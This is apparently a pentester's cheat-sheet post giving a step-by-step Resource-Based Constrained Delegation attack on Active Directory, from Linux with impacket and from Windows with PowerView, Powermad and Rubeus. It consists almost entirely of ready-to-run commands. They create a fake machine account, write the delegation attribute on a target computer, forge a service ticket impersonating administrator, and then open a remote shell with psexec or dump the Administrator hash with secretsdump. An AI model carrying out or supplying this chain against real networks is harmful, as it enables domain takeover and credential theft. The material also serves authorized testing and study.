---
title: "RBCD Attack"
date: 2024-7-30
tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-based constrained delegation", "s4u", "impersonate"]
---

---
### RBCD Attack (From Linux)

#### 0. Check machine account quota

```bash
nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ
```

#### 1. Add a fake computer

```bash
impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD>
```

#### 2. Rbcd attack

```bash
impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD>
```

#### 3. Impersonate

```bash
sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password'
```

#### 4. Import ticket

```bash
export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
```

#### 5. Post-Attack

```bash
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```bash
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

### RBCD Attack (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Check machine account quota

```powershell
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

#### 3. Import Powermad.ps1

[Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)

```powershell
. .\Powermad.ps1
```

```powershell
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force)
```

#### 4. Attack

```powershell
$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```powershell
$fakesid
```

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

```powershell
Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### 5. Check SecurityIdentifier is now fakesid 

```powershell
$RawBytes = Get-DomainComputer TARGET_COMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```powershell
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```powershell
$Descriptor.DiscretionaryAcl
```

#### 6. Impersonate

```powershell
.\rubeus.exe hash /password:password /user:EvilComputer /domain:<DOMAIN>
```

```powershell
.\rubeus.exe s4u /user:EvilComputer$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
```

#### 7. Convert to ccache format

[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)

```bash
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

```bash
export KRB5CCNAME=secrets.ccache
```

#### 8. Post-Attack

```bash
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```bash
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

<br>
